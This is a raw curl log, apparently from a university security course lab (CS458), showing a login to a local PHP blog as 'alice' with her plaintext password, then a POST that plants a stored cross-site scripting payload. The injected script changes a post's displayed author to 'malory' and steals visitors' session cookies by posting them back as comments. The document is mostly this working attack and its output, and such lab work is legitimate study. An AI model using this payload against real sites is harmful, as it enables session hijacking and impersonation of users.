*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> POST /ss2liang//post.php HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 45
> Content-Type: application/x-www-form-urlencoded
> 
} [45 bytes data]
* upload completely sent off: 45 out of 45 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Thu, 03 Mar 2022 21:30:43 GMT
< Server: Apache/2.2.16 (Debian)
< X-Powered-By: PHP/5.3.3-7+squeeze14
* Added cookie CS458="qs28is15b3i0gpg0kvj37lmtj4" for domain localhost, path /, expire 0
< Set-Cookie: CS458=qs28is15b3i0gpg0kvj37lmtj4; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Location: index.php
< Vary: Accept-Encoding
< Content-Length: 17
< Content-Type: text/html
< 
{ [17 bytes data]
* Connection #0 to host localhost left intact
alice
easypasswd
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> POST /ss2liang//post.php HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> Cookie: CS458=qs28is15b3i0gpg0kvj37lmtj4
> Content-Length: 1089
> Content-Type: application/x-www-form-urlencoded
> Expect: 100-continue
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
} [1089 bytes data]
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Thu, 03 Mar 2022 21:30:44 GMT
< Server: Apache/2.2.16 (Debian)
< X-Powered-By: PHP/5.3.3-7+squeeze14
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Location: index.php
< Vary: Accept-Encoding
< Content-Length: 1058
< Content-Type: text/html
< 
{ [1058 bytes data]
* Connection #0 to host localhost left intact
1
NEW
 <script> function nonPersistent(){ let url = window.location.href; let isView = url.search('view.php[?]id=[0-9].'); if(isView > 0){ let author = document.querySelector('small').textContent.toString(); let authorArr = author.split(' '); authorArr[2] = 'malory'; let newAuthor = authorArr.join(' '); document.querySelector('small').textContent = newAuthor; } } function getPostId(){ let url = window.location.href; let isView = url.search('view.php[?]id=[0-9].'); if(isView){ let idArr = url.split('='); let id = parseInt(idArr[1]); return id; } return -1 } function leakCookies(postId){ if(postId === -1){ return; } let cookie = document.cookie; let cookieVal = cookie.split('=')[1].toString(); let formData = new FormData(); formData.append('comment', cookieVal); formData.append('parent', postId); formData.append('form', 'comment'); formData.append('uid', 0); formData.append('submit', ''); let requestOptions = { method: 'POST', body: formData }; let res = fetch('post.php', requestOptions); } nonPersistent(); leakCookies(getPostId()); </script> 
